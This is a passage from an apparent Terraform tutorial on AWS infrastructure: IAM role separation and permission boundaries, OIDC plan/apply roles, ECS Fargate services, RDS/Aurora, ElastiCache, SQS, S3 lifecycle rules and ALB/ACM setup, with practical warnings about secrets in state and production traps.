    resources = [for arn in values(var.secrets) : arn]
  }
  statement {
    effect    = "Allow"
    actions   = ["kms:Decrypt"]
    resources = [var.secrets_kms_key_arn]
  }
}

resource "aws_iam_role_policy" "execution_secrets" {
  count  = length(var.secrets) > 0 ? 1 : 0
  name   = "read-secrets"
  role   = aws_iam_role.execution.id
  policy = data.aws_iam_policy_document.execution_secrets.json
}

# --- Task role ---
resource "aws_iam_role" "task" {
  name               = "${local.name_prefix}-${var.name}-task"
  assume_role_policy = data.aws_iam_policy_document.ecs_assume.json
  tags               = local.common_tags
}

resource "aws_iam_role_policy" "task" {
  name   = "application"
  role   = aws_iam_role.task.id
  policy = data.aws_iam_policy_document.task.json
}
```

⚠️ **Putting application permissions on the execution role is a real privilege escalation.** The execution role is used by the ECS agent, which runs outside your container's security boundary. Keep them separate.

### 31.3 Permission boundaries

A permission boundary is a policy that defines the **maximum** permissions a role can have, regardless of what policies are attached to it. It is how a platform team lets application teams create their own roles safely.

```hcl
data "aws_iam_policy_document" "boundary" {
  statement {
    sid       = "AllowServiceScope"
    effect    = "Allow"
    actions   = ["s3:*", "sqs:*", "dynamodb:*", "secretsmanager:GetSecretValue", "logs:*"]
    resources = ["*"]
  }

  statement {
    sid    = "DenyIamAndOrgChanges"
    effect = "Deny"
    actions = [
      "iam:*",
      "organizations:*",
      "account:*",
      "sts:AssumeRole",
    ]
    resources = ["*"]
  }

  statement {
    sid       = "DenyBoundaryRemoval"
    effect    = "Deny"
    actions   = ["iam:DeleteRolePermissionsBoundary"]
    resources = ["*"]
  }

  statement {
    sid       = "RegionLock"
    effect    = "Deny"
    notactions = ["iam:*", "sts:*", "cloudfront:*", "route53:*", "s3:ListAllMyBuckets"]
    resources = ["*"]
    condition {
      test     = "StringNotEquals"
      variable = "aws:RequestedRegion"
      values   = [var.aws_region, "us-east-1"]
    }
  }
}

resource "aws_iam_policy" "boundary" {
  name   = "${var.project}-service-boundary"
  policy = data.aws_iam_policy_document.boundary.json
}

resource "aws_iam_role" "task" {
  name                 = "${local.name_prefix}-${var.name}-task"
  assume_role_policy   = data.aws_iam_policy_document.ecs_assume.json
  permissions_boundary = aws_iam_policy.boundary.arn      # ← enforced ceiling
}
```

🧠 The effective permission is the **intersection** of the attached policies and the boundary. Even if a team attaches `AdministratorAccess`, the boundary caps them.

### 31.4 Separate plan and apply roles

This is the highest-value IAM decision in the whole pipeline.

```hcl
# --- PLAN role: read-only, assumable from pull_request runs ---
data "aws_iam_policy_document" "plan_trust" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      test     = "StringLike"
      variable = "token.actions.githubusercontent.com:sub"
      values   = ["repo:acme/infrastructure:pull_request"]
    }
  }
}

resource "aws_iam_role" "terraform_plan" {
  name               = "terraform-plan"
  assume_role_policy = data.aws_iam_policy_document.plan_trust.json
  max_session_duration = 3600
}

resource "aws_iam_role_policy_attachment" "plan_readonly" {
  role       = aws_iam_role.terraform_plan.name
  policy_arn = "arn:aws:iam::aws:policy/ReadOnlyAccess"
}

# ...plus write access to ONLY the state object and its lock
data "aws_iam_policy_document" "plan_state" {
  statement {
    effect    = "Allow"
    actions   = ["s3:ListBucket"]
    resources = [aws_s3_bucket.tfstate.arn]
  }
  statement {
    effect  = "Allow"
    actions = ["s3:GetObject", "s3:PutObject", "s3:DeleteObject"]
    resources = [
      "${aws_s3_bucket.tfstate.arn}/*",
      "${aws_s3_bucket.tfstate.arn}/*.tflock",
    ]
  }
  statement {
    effect    = "Allow"
    actions   = ["kms:Decrypt", "kms:GenerateDataKey"]
    resources = [aws_kms_key.tfstate.arn]
  }
}

resource "aws_iam_role_policy" "plan_state" {
  name   = "state-access"
  role   = aws_iam_role.terraform_plan.id
  policy = data.aws_iam_policy_document.plan_state.json
}

# --- APPLY role: write, assumable ONLY from the production environment ---
data "aws_iam_policy_document" "apply_trust" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      # ⚠️ EXACT match on the environment claim, not a wildcard.
      values   = ["repo:acme/infrastructure:environment:production"]
    }
  }
}

resource "aws_iam_role" "terraform_apply" {
  name                 = "terraform-apply-production"
  assume_role_policy   = data.aws_iam_policy_document.apply_trust.json
  max_session_duration = 3600
  permissions_boundary = aws_iam_policy.terraform_boundary.arn
}
```

🧠 **Why this matters so much:** a PR from a fork, or a malicious change to a workflow file on a branch, can at worst assume the **read-only** plan role. To reach the apply role it would have to run in a job declaring `environment: production`, which triggers GitHub's environment protection rules — required reviewers, branch restrictions. The OIDC claim and the environment gate reinforce each other.

### 31.5 A boundary for the apply role itself

Even the apply role should not be able to do everything:

```hcl
data "aws_iam_policy_document" "terraform_boundary" {
  statement {
    effect    = "Allow"
    actions   = ["*"]
    resources = ["*"]
  }

  statement {
    sid    = "ProtectStateAndIdentity"
    effect = "Deny"
    actions = [
      "iam:DeleteRole",
      "iam:DeleteRolePermissionsBoundary",
      "iam:DeleteOpenIDConnectProvider",
      "organizations:LeaveOrganization",
      "account:CloseAccount",
    ]
    resources = ["*"]
  }

  statement {
    sid    = "ProtectTheStateBucket"
    effect = "Deny"
    actions = ["s3:DeleteBucket", "s3:PutBucketPolicy"]
    resources = [aws_s3_bucket.tfstate.arn]
  }

  statement {
    sid       = "ProtectKmsKeys"
    effect    = "Deny"
    actions   = ["kms:ScheduleKeyDeletion", "kms:DisableKey"]
    resources = ["*"]
  }
}
```

---

## Chapter 32 — ECS on Fargate

### 32.1 The architecture

```mermaid
flowchart TD
    R53["Route53 A record<br/>api.example.com"] --> ALB["Application Load Balancer<br/>public subnets"]
    ACM["ACM certificate<br/>DNS validated"] --> LIS["HTTPS listener :443"]
    ALB --> LIS
    LIS --> TG["Target group<br/>IP target type"]
    TG --> SVC["ECS Service<br/>private subnets"]
    SVC --> TD["Task definition<br/>Fargate, awsvpc"]
    TD --> C["Container<br/>your Spring Boot / Go image"]
    C --> LOGS["CloudWatch log group"]
    ER["Execution role"] -.->|"pull image, fetch secrets"| TD
    TR["Task role"] -.->|"runtime AWS calls"| C
    SM["Secrets Manager"] -.->|"injected as env vars<br/>by the ECS agent"| C
    ECR["ECR repository"] -.-> TD
    AS["Application Auto Scaling<br/>target tracking"] --> SVC
```

### 32.2 The cluster

```hcl
resource "aws_ecs_cluster" "main" {
  name = local.name_prefix

  setting {
    name  = "containerInsights"
    value = var.environment == "production" ? "enhanced" : "disabled"   # 💰 enhanced costs more
  }

  configuration {
    execute_command_configuration {
      logging = "OVERRIDE"
      log_configuration {
        cloud_watch_log_group_name     = aws_cloudwatch_log_group.exec.name
        cloud_watch_encryption_enabled = true
      }
    }
  }

  tags = local.common_tags
}

resource "aws_ecs_cluster_capacity_providers" "main" {
  cluster_name       = aws_ecs_cluster.main.name
  capacity_providers = ["FARGATE", "FARGATE_SPOT"]

  default_capacity_provider_strategy {
    capacity_provider = "FARGATE"
    weight            = var.environment == "production" ? 100 : 0
    base              = var.environment == "production" ? 2 : 0
  }

  dynamic "default_capacity_provider_strategy" {
    for_each = var.environment != "production" ? [1] : []
    content {
      capacity_provider = "FARGATE_SPOT"
      weight            = 100
    }
  }
}
```

💰 **FARGATE_SPOT is roughly 70% cheaper** but tasks can be reclaimed with two minutes' notice. Excellent for dev, staging, batch workers and anything that tolerates interruption. For production web traffic, use a base of on-demand tasks plus spot for the scaled portion.

### 32.3 The task definition

```hcl
resource "aws_cloudwatch_log_group" "service" {
  name              = "/ecs/${local.name_prefix}/${var.name}"
  retention_in_days = var.environment == "production" ? 90 : 14
  kms_key_id        = var.logs_kms_key_arn
  tags              = local.common_tags
}

resource "aws_ecs_task_definition" "this" {
  family                   = "${local.name_prefix}-${var.name}"
  requires_compatibilities = ["FARGATE"]
  network_mode             = "awsvpc"
  cpu                      = var.cpu
  memory                   = var.memory
  execution_role_arn       = aws_iam_role.execution.arn
  task_role_arn            = aws_iam_role.task.arn

  runtime_platform {
    operating_system_family = "LINUX"
    cpu_architecture        = var.cpu_architecture     # "ARM64" is ~20% cheaper
  }

  container_definitions = jsonencode([
    {
      name      = var.name
      image     = var.image
      essential = true

      portMappings = [{
        containerPort = var.container_port
        protocol      = "tcp"
        name          = var.name
        appProtocol   = "http"
      }]

      environment = [
        for k, v in merge(var.environment_variables, {
          SERVICE_NAME = var.name
          ENVIRONMENT  = var.environment
          AWS_REGION   = var.aws_region
        }) : { name = k, value = tostring(v) }
      ]

      # ⚠️ 'secrets' (not 'environment') — resolved by the ECS agent at task start.
      # The VALUES never pass through Terraform and never enter state.
      secrets = [
        for k, arn in var.secrets : { name = k, valueFrom = arn }
      ]

      logConfiguration = {
        logDriver = "awslogs"
        options = {
          "awslogs-group"         = aws_cloudwatch_log_group.service.name
          "awslogs-region"        = var.aws_region
          "awslogs-stream-prefix" = "ecs"
          "mode"                  = "non-blocking"
          "max-buffer-size"       = "25m"
        }
      }

      healthCheck = {
        command     = ["CMD-SHELL", "curl -f http://localhost:${var.container_port}${var.health_check_path} || exit 1"]
        interval    = 30
        timeout     = 5
        retries     = 3
        startPeriod = 60          # generous — JVM startup is slow
      }

      ulimits = [{
        name      = "nofile"
        softLimit = 65536
        hardLimit = 65536
      }]

      linuxParameters = {
        initProcessEnabled = true      # proper PID 1, so signals and zombie reaping work
      }

      stopTimeout = 30
    }
  ])

  tags = local.common_tags

  lifecycle {
    create_before_destroy = true
  }
}
```

🧠 **`secrets` vs `environment` is the single most important line in this file.** Using `environment` with a value read from a Terraform data source puts the secret in your state, in your plan output, and in your CI logs. Using `secrets` with an ARN means Terraform only ever handles the ARN.

💰 **`cpu_architecture = "ARM64"`** (Graviton) is roughly 20% cheaper for the same performance, and both Java 21 and Go build cleanly for ARM64. If your images are multi-arch, this is free money.

### 32.4 The service

```hcl
resource "aws_ecs_service" "this" {
  name            = var.name
  cluster         = var.cluster_arn
  task_definition = aws_ecs_task_definition.this.arn
  desired_count   = var.desired_count
  launch_type     = null                     # using capacity provider strategy instead

  capacity_provider_strategy {
    capacity_provider = "FARGATE"
    weight            = 1
    base              = var.min_on_demand_tasks
  }

  network_configuration {
    subnets          = var.subnet_ids
    security_groups  = [aws_security_group.service.id]
    assign_public_ip = false                 # ⚠️ always false for private tasks
  }

  load_balancer {
    target_group_arn = aws_lb_target_group.this.arn
    container_name   = var.name
    container_port   = var.container_port
  }

  # Rolling deployment with an automatic rollback on failure
  deployment_controller { type = "ECS" }

  deployment_circuit_breaker {
    enable   = true
    rollback = true
  }

  deployment_maximum_percent         = 200
  deployment_minimum_healthy_percent = 100    # ⚠️ 100 for zero-downtime

  health_check_grace_period_seconds = 120     # generous for JVM startup

  enable_execute_command = var.environment != "production"

  propagate_tags = "SERVICE"
  tags           = local.common_tags

  lifecycle {
    ignore_changes = [
      # The CD pipeline updates the image; Terraform must not fight it.
      task_definition,
      # Autoscaling owns this after creation.
      desired_count,
    ]
  }

  depends_on = [
    aws_lb_listener_rule.this,
    aws_iam_role_policy_attachment.execution_managed,
  ]
}
```

🧠 **`deployment_circuit_breaker` with `rollback = true` is the most valuable setting here.** If the new tasks fail their health checks, ECS automatically reverts to the previous task definition. You get automatic rollback with no pipeline logic at all.

### 32.5 The Terraform-vs-CD boundary

This is a design decision, not a detail.

```mermaid
flowchart TD
    subgraph A["Option A — Terraform owns the image tag"]
        A1["Every deploy is a Terraform apply"]
        A2["+ One system, full audit trail<br/>− Slow (init + refresh + plan per deploy)<br/>− App teams need Terraform access<br/>− Deploys blocked by unrelated infra drift"]
    end
    subgraph B["Option B — RECOMMENDED: CD owns the image"]
        B1["Terraform creates the service and the FIRST task definition.<br/>ignore_changes = [task_definition, desired_count].<br/>The CD pipeline registers new task definitions<br/>and calls UpdateService."]
        B2["+ Deploys take seconds<br/>+ App teams need no Terraform access<br/>+ Infra and app changes decoupled<br/>− Two systems touch the service"]
    end
```

The CD side of option B, in a service repo's workflow:

```yaml
- name: Deploy new image
  run: |
    set -euo pipefail
    TD=$(aws ecs describe-task-definition \
          --task-definition "acme-production-api" \
          --query taskDefinition)
    echo "$TD" | jq --arg IMG "$IMAGE" '
      .containerDefinitions[0].image = $IMG
      | del(.taskDefinitionArn, .revision, .status, .requiresAttributes,
            .compatibilities, .registeredAt, .registeredBy)
    ' > new-td.json
    ARN=$(aws ecs register-task-definition \
            --cli-input-json file://new-td.json \
            --query 'taskDefinition.taskDefinitionArn' --output text)
    aws ecs update-service \
      --cluster acme-production --service api \
      --task-definition "$ARN"
    aws ecs wait services-stable --cluster acme-production --services api
```

**Recommendation: option B.** Terraform defines the *shape* of the service; the CD pipeline changes *which version runs*. This mirrors how Kubernetes shops split Terraform (cluster) from ArgoCD (workloads).

### 32.6 Autoscaling

```hcl
resource "aws_appautoscaling_target" "this" {
  count = var.autoscaling != null ? 1 : 0

  service_namespace  = "ecs"
  resource_id        = "service/${var.cluster_name}/${aws_ecs_service.this.name}"
  scalable_dimension = "ecs:service:DesiredCount"
  min_capacity       = var.autoscaling.min_capacity
  max_capacity       = var.autoscaling.max_capacity
}

resource "aws_appautoscaling_policy" "cpu" {
  count = var.autoscaling != null ? 1 : 0

  name               = "${var.name}-cpu"
  policy_type        = "TargetTrackingScaling"
  service_namespace  = aws_appautoscaling_target.this[0].service_namespace
  resource_id        = aws_appautoscaling_target.this[0].resource_id
  scalable_dimension = aws_appautoscaling_target.this[0].scalable_dimension

  target_tracking_scaling_policy_configuration {
    target_value       = var.autoscaling.cpu_target
    scale_in_cooldown  = var.autoscaling.scale_in_cooldown    # slow in — avoid flapping
    scale_out_cooldown = var.autoscaling.scale_out_cooldown   # fast out — absorb spikes

    predefined_metric_specification {
      predefined_metric_type = "ECSServiceAverageCPUUtilization"
    }
  }
}

resource "aws_appautoscaling_policy" "requests" {
  count = var.autoscaling != null && var.target_group_label != null ? 1 : 0

  name               = "${var.name}-requests"
  policy_type        = "TargetTrackingScaling"
  service_namespace  = aws_appautoscaling_target.this[0].service_namespace
  resource_id        = aws_appautoscaling_target.this[0].resource_id
  scalable_dimension = aws_appautoscaling_target.this[0].scalable_dimension

  target_tracking_scaling_policy_configuration {
    target_value = var.autoscaling.requests_per_target

    predefined_metric_specification {
      predefined_metric_type = "ALBRequestCountPerTarget"
      resource_label         = var.target_group_label
    }
  }
}
```

🧠 **Asymmetric cooldowns are the point.** Scale out fast (60s) so a traffic spike does not cause errors; scale in slowly (300s) so a brief dip does not terminate capacity you are about to need again.

For request-driven services, `ALBRequestCountPerTarget` is usually a better signal than CPU — it responds before CPU saturates.

---
## Chapter 33 — The Data Layer: RDS, ElastiCache, SQS, S3

### 33.1 RDS PostgreSQL

```hcl
resource "aws_db_subnet_group" "main" {
  name       = "${local.name_prefix}-postgres"
  subnet_ids = var.database_subnet_ids
  tags       = local.common_tags
}

resource "aws_db_parameter_group" "main" {
  name_prefix = "${local.name_prefix}-pg17-"
  family      = "postgres17"

  parameter {
    name  = "log_min_duration_statement"
    value = "1000"                       # log queries slower than 1s
  }
  parameter {
    name  = "log_connections"
    value = "1"
  }
  parameter {
    name         = "shared_preload_libraries"
    value        = "pg_stat_statements"
    apply_method = "pending-reboot"      # ⚠️ static parameter — requires a restart
  }
  parameter {
    name  = "rds.force_ssl"
    value = "1"                          # reject non-TLS connections
  }

  lifecycle { create_before_destroy = true }
}

resource "aws_db_instance" "main" {
  identifier = "${local.name_prefix}-postgres"

  engine         = "postgres"
  engine_version = var.engine_version          # e.g. "17.2"
  instance_class = var.instance_class

  allocated_storage     = var.allocated_storage
  max_allocated_storage = var.max_allocated_storage   # enables storage autoscaling
  storage_type          = "gp3"
  storage_encrypted     = true
  kms_key_id            = var.kms_key_arn

  db_name  = var.database_name
  username = var.master_username

  # ✅ BEST: AWS generates, stores and rotates the password in Secrets Manager.
  # The password NEVER passes through Terraform, so it never enters state.
  manage_master_user_password   = true
  master_user_secret_kms_key_id = var.kms_key_arn

  db_subnet_group_name   = aws_db_subnet_group.main.name
  vpc_security_group_ids = [aws_security_group.database.id]
  parameter_group_name   = aws_db_parameter_group.main.name
  port                   = 5432

  multi_az               = var.multi_az
  availability_zone      = var.multi_az ? null : var.availability_zone

  backup_retention_period   = var.backup_retention_period
  backup_window             = "18:00-19:00"       # UTC — off-peak for IST traffic
  maintenance_window        = "sun:19:30-sun:20:30"
  copy_tags_to_snapshot     = true
  delete_automated_backups  = false

  deletion_protection       = var.environment == "production"
  skip_final_snapshot       = var.environment != "production"
  final_snapshot_identifier = var.environment == "production" ? "${local.name_prefix}-final-${formatdate("YYYYMMDDhhmmss", timestamp())}" : null

  performance_insights_enabled          = true
  performance_insights_retention_period = var.environment == "production" ? 731 : 7
  performance_insights_kms_key_id       = var.kms_key_arn
  monitoring_interval                   = 60
  monitoring_role_arn                   = aws_iam_role.rds_monitoring.arn
  enabled_cloudwatch_logs_exports       = ["postgresql", "upgrade"]

  auto_minor_version_upgrade = var.environment != "production"
  apply_immediately          = false          # ⚠️ see below

  tags = local.common_tags

  lifecycle {
    prevent_destroy = true

    ignore_changes = [
      # timestamp() in final_snapshot_identifier changes every plan
      final_snapshot_identifier,
      # AWS rotates the managed master password
      master_user_secret,
      # Minor version upgrades applied during maintenance windows
      engine_version,
    ]
  }
}
```

⚠️ **`apply_immediately` is a genuine production trap.** Set to `true`, a change to `instance_class` restarts your database *the moment you apply* — during business hours, with no warning to anyone. Set to `false`, the change queues until the maintenance window. **Keep it `false` in production** and schedule disruptive changes deliberately.

⚠️ **Attributes on `aws_db_instance` that force replacement** — read the plan carefully for any of these:

| Attribute | Replaces? |
|---|---|
| `identifier` | ✅ Yes |
| `engine` | ✅ Yes |
| `db_name` | ✅ Yes |
| `availability_zone` (single-AZ) | ✅ Yes |
| `db_subnet_group_name` | ✅ Yes |
| `instance_class` | ❌ No — in-place with a restart |
| `allocated_storage` | ❌ No — online |
| `multi_az` | ❌ No — in-place |
| `engine_version` (major) | ❌ No, but it is a one-way upgrade |

### 33.2 The master password: three approaches ranked

```mermaid
flowchart TD
    subgraph BAD["❌ WORST — password in a variable"]
        B1["var.db_password passed to<br/>aws_db_instance.password"]
        B2["Secret lands in STATE in plaintext.<br/>Anyone with state read access has it.<br/>It is in every S3 state version forever."]
    end
    subgraph OK["⚠️ BETTER — random_password + Secrets Manager"]
        O1["random_password generates it,<br/>Terraform writes it to Secrets Manager"]
        O2["Still in state: both the random_password<br/>resource AND the secret version."]
    end
    subgraph WO["✅ GOOD — write-only argument · TF 1.11+"]
        W1["password_wo + password_wo_version<br/>sourced from an ephemeral resource"]
        W2["Value passes through memory only.<br/>NEVER written to state."]
    end
    subgraph BEST["✅ BEST — manage_master_user_password"]
        M1["AWS generates, stores and rotates it.<br/>Terraform never sees the value at all."]
    end
```

```hcl
# ✅ BEST — AWS-managed (shown in the example above)
manage_master_user_password = true
# Read the ARN for injection into the app:
# aws_db_instance.main.master_user_secret[0].secret_arn

# ✅ GOOD — write-only, when you must control the value
# 🔬 Terraform 1.11+ / OpenTofu 1.11+
ephemeral "aws_secretsmanager_secret_version" "db" {
  secret_id = aws_secretsmanager_secret.db.id
}

resource "aws_db_instance" "main" {
  password_wo         = ephemeral.aws_secretsmanager_secret_version.db.secret_string
  password_wo_version = var.password_version    # bump this integer to trigger a rotation
}
```

### 33.3 Aurora, briefly

For production Postgres at any real scale, Aurora Serverless v2 is usually the better default:

```hcl
resource "aws_rds_cluster" "main" {
  cluster_identifier = "${local.name_prefix}-aurora"
  engine             = "aurora-postgresql"
  engine_mode        = "provisioned"
  engine_version     = "16.4"
  database_name      = var.database_name
  master_username    = var.master_username

  manage_master_user_password = true

  serverlessv2_scaling_configuration {
    min_capacity = var.environment == "production" ? 2 : 0.5
    max_capacity = var.environment == "production" ? 32 : 4
  }

  db_subnet_group_name   = aws_db_subnet_group.main.name
  vpc_security_group_ids = [aws_security_group.database.id]
  storage_encrypted      = true
  kms_key_id             = var.kms_key_arn

  backup_retention_period      = var.backup_retention_period
  preferred_backup_window      = "18:00-19:00"
  deletion_protection          = var.environment == "production"
  skip_final_snapshot          = var.environment != "production"
  enabled_cloudwatch_logs_exports = ["postgresql"]

  lifecycle {
    prevent_destroy = true
    ignore_changes  = [master_user_secret, engine_version]
  }
}

resource "aws_rds_cluster_instance" "main" {
  count = var.instance_count

  identifier         = "${local.name_prefix}-aurora-${count.index}"
  cluster_identifier = aws_rds_cluster.main.id
  instance_class     = "db.serverless"
  engine             = aws_rds_cluster.main.engine
  engine_version     = aws_rds_cluster.main.engine_version

  performance_insights_enabled = true
  monitoring_interval          = 60
  monitoring_role_arn          = aws_iam_role.rds_monitoring.arn
}
```

🧠 Here `count` is the right choice: the instances are genuinely interchangeable, and index shifting causes no harm because Aurora manages failover.

### 33.4 ElastiCache Redis

```hcl
resource "aws_elasticache_subnet_group" "main" {
  name       = "${local.name_prefix}-redis"
  subnet_ids = var.database_subnet_ids
}

resource "aws_elasticache_replication_group" "main" {
  replication_group_id = "${local.name_prefix}-redis"
  description          = "Redis for ${local.name_prefix}"

  engine               = "redis"
  engine_version       = "7.1"
  node_type            = var.node_type
  parameter_group_name = aws_elasticache_parameter_group.main.name
  port                 = 6379

  num_cache_clusters         = var.environment == "production" ? 3 : 1
  automatic_failover_enabled = var.environment == "production"
  multi_az_enabled           = var.environment == "production"

  subnet_group_name  = aws_elasticache_subnet_group.main.name
  security_group_ids = [aws_security_group.redis.id]

  at_rest_encryption_enabled = true
  kms_key_id                 = var.kms_key_arn
  transit_encryption_enabled = true
  auth_token                 = var.redis_auth_token       # ⚠️ enters state — see below

  snapshot_retention_limit = var.environment == "production" ? 7 : 0
  snapshot_window          = "18:00-19:00"
  maintenance_window       = "sun:20:00-sun:21:00"

  auto_minor_version_upgrade = true
  apply_immediately          = false

  log_delivery_configuration {
    destination      = aws_cloudwatch_log_group.redis_slow.name
    destination_type = "cloudwatch-logs"
    log_format       = "json"
    log_type         = "slow-log"
  }

  tags = local.common_tags

  lifecycle {
    prevent_destroy = true
    ignore_changes  = [auth_token, engine_version]
  }
}
```

⚠️ **`auth_token` enters state.** There is no `manage_master_user_password` equivalent for ElastiCache. Options: use `auth_token_wo` if your provider version supports write-only arguments, or generate the token outside Terraform and inject it into both ElastiCache and the application via Secrets Manager, with Terraform never seeing the value.

### 33.5 SQS with a dead-letter queue

```hcl
resource "aws_sqs_queue" "dlq" {
  name                      = "${local.name_prefix}-${var.name}-dlq"
  message_retention_seconds = 1209600        # 14 days — the maximum
  kms_master_key_id         = var.kms_key_arn
  kms_data_key_reuse_period_seconds = 300
  tags                      = local.common_tags
}

resource "aws_sqs_queue" "main" {
  name                       = "${local.name_prefix}-${var.name}"
  visibility_timeout_seconds = var.visibility_timeout     # ⚠️ must exceed your max processing time
  message_retention_seconds  = 345600                     # 4 days
  receive_wait_time_seconds  = 20                         # long polling — 💰 fewer empty receives
  max_message_size           = 262144

  kms_master_key_id                 = var.kms_key_arn
  kms_data_key_reuse_period_seconds = 300

  redrive_policy = jsonencode({
    deadLetterTargetArn = aws_sqs_queue.dlq.arn
    maxReceiveCount     = 5
  })

  tags = local.common_tags
}

resource "aws_sqs_queue_redrive_allow_policy" "dlq" {
  queue_url = aws_sqs_queue.dlq.id
  redrive_allow_policy = jsonencode({
    redrivePermission = "byQueue"
    sourceQueueArns   = [aws_sqs_queue.main.arn]
  })
}

# An alarm on the DLQ is not optional — messages landing here are lost work
resource "aws_cloudwatch_metric_alarm" "dlq_messages" {
  alarm_name          = "${local.name_prefix}-${var.name}-dlq-not-empty"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "ApproximateNumberOfMessagesVisible"
  namespace           = "AWS/SQS"
  period              = 300
  statistic           = "Maximum"
  threshold           = 0
  alarm_description   = "Messages are in the DLQ for ${var.name} — investigate"
  treat_missing_data  = "notBreaching"

  dimensions = { QueueName = aws_sqs_queue.dlq.name }
  alarm_actions = [var.alarm_topic_arn]
  tags = local.common_tags
}
```

⚠️ **`visibility_timeout_seconds` must be longer than your worst-case message processing time**, including retries. If processing takes 90 seconds and the timeout is 30, the message becomes visible again and a second worker picks it up — duplicate processing, and after 5 such cycles it lands in the DLQ despite never actually failing.

### 33.6 S3 for application data

Same split-resource pattern as Chapter 7, plus:

```hcl
resource "aws_s3_bucket_lifecycle_configuration" "uploads" {
  bucket = aws_s3_bucket.uploads.id

  rule {
    id     = "transition-and-expire"
    status = "Enabled"
    filter {}

    transition {
      days          = 30
      storage_class = "STANDARD_IA"
    }
    transition {
      days          = 90
      storage_class = "GLACIER_IR"
    }
    expiration {
      days = 2555            # 7 years
    }
    noncurrent_version_expiration {
      noncurrent_days = 90
    }
    abort_incomplete_multipart_upload {
      days_after_initiation = 7
    }
  }
}

# Restrict access to your VPC endpoint only
data "aws_iam_policy_document" "uploads" {
  statement {
    sid    = "DenyOutsideVpce"
    effect = "Deny"
    principals { type = "*", identifiers = ["*"] }
    actions   = ["s3:*"]
    resources = [aws_s3_bucket.uploads.arn, "${aws_s3_bucket.uploads.arn}/*"]

    condition {
      test     = "StringNotEquals"
      variable = "aws:SourceVpce"
      values   = [aws_vpc_endpoint.s3.id]
    }
    condition {
      test     = "Bool"
      variable = "aws:PrincipalIsAWSService"
      values   = ["false"]
    }
  }
}
```

💰 Lifecycle transitions are the single easiest storage cost win. Standard-IA is roughly 45% cheaper than Standard; Glacier Instant Retrieval roughly 68% cheaper. Just make sure objects are actually accessed rarely, because retrieval and early-deletion charges apply.

---

## Chapter 34 — The Edge: ALB, Route53, ACM

### 34.1 ACM certificate with DNS validation

```hcl
resource "aws_acm_certificate" "main" {
  domain_name               = var.domain_name
  subject_alternative_names = var.subject_alternative_names
  validation_method         = "DNS"

  tags = local.common_tags

  lifecycle {
    create_before_destroy = true      # ⚠️ essential — see below
  }
}

resource "aws_route53_record" "cert_validation" {
  for_each = {
    for dvo in aws_acm_certificate.main.domain_validation_options :
    dvo.domain_name => {
      name   = dvo.resource_record_name
      record = dvo.resource_record_value
      type   = dvo.resource_record_type
    }
  }

  allow_overwrite = true
  name            = each.value.name
  records         = [each.value.record]
  ttl             = 60
  type            = each.value.type
  zone_id         = var.route53_zone_id
}

resource "aws_acm_certificate_validation" "main" {
  certificate_arn         = aws_acm_certificate.main.arn
  validation_record_fqdns = [for r in aws_route53_record.cert_validation : r.fqdn]

  timeouts { create = "10m" }
}
```

⚠️ **`create_before_destroy` on the certificate is not optional.** Without it, changing `subject_alternative_names` destroys the certificate first — which detaches it from the listener, which breaks HTTPS — before creating the new one.

🧠 The `for_each` over `domain_validation_options` is one of the most-copied patterns in Terraform. It creates exactly one validation record per domain, keyed by domain name so adding a SAN does not disturb existing records.

### 34.2 The ALB

```hcl
resource "aws_lb" "main" {
  name               = substr("${local.name_prefix}-alb", 0, 32)    # ⚠️ 32-char limit
  load_balancer_type = "application"
  internal           = false
  subnets            = var.public_subnet_ids
  security_groups    = [aws_security_group.alb.id]

  enable_deletion_protection = var.environment == "production"
  enable_http2               = true
  idle_timeout               = 60
  drop_invalid_header_fields = true
  desync_mitigation_mode     = "strictest"
  preserve_host_header       = true

  access_logs {
    bucket  = var.access_logs_bucket
    prefix  = "alb/${local.name_prefix}"
    enabled = true
  }

  tags = local.common_tags
}

resource "aws_lb_listener" "http_redirect" {
  load_balancer_arn = aws_lb.main.arn
  port              = 80
  protocol          = "HTTP"

  default_action {
    type = "redirect"
    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }
  }
}

resource "aws_lb_listener" "https" {
  load_balancer_arn = aws_lb.main.arn
  port              = 443
  protocol          = "HTTPS"
  ssl_policy        = "ELBSecurityPolicy-TLS13-1-2-2021-06"
  certificate_arn   = aws_acm_certificate_validation.main.certificate_arn

  default_action {
    type = "fixed-response"
    fixed_response {
      content_type = "application/json"
      message_body = jsonencode({ error = "not found" })
      status_code  = "404"
    }
  }
}
```

🧠 **A 404 fixed-response default action is better than routing to a service.** Every route becomes an explicit listener rule, so there is no accidental catch-all sending unmatched traffic to whichever service happens to be the default.

⚠️ Reference `aws_acm_certificate_validation.main.certificate_arn`, **not** `aws_acm_certificate.main.arn`. The validation resource is what guarantees the certificate is actually issued before the listener tries to use it.

### 34.3 Target group and listener rule

```hcl
resource "aws_lb_target_group" "this" {
  name_prefix = substr(var.name, 0, 6)       # ⚠️ name_prefix max 6 chars
  port        = var.container_port
  protocol    = "HTTP"
  vpc_id      = var.vpc_id
  target_type = "ip"                          # required for Fargate awsvpc

  deregistration_delay = 30                   # drain time before removing a task

  health_check {
    enabled             = true
    path                = var.health_check_path
    protocol            = "HTTP"
    matcher             = "200"
    interval            = 15
    timeout             = 5
    healthy_threshold   = 2
    unhealthy_threshold = 3
  }

  stickiness {
    type    = "lb_cookie"
    enabled = false                           # stateless services should not need this
  }

  tags = local.common_tags

  lifecycle { create_before_destroy = true }
}

resource "aws_lb_listener_rule" "this" {
  listener_arn = var.listener_arn
  priority     = var.listener_priority

  action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.this.arn
  }

  condition {
    host_header { values = [var.hostname] }
  }

  tags = local.common_tags
}
```

⚠️ **Listener rule priorities must be unique within a listener.** Allocate ranges per service (api: 100–199, worker: 200–299) and document it, or you will get intermittent `PriorityInUse` errors when two stacks apply concurrently.

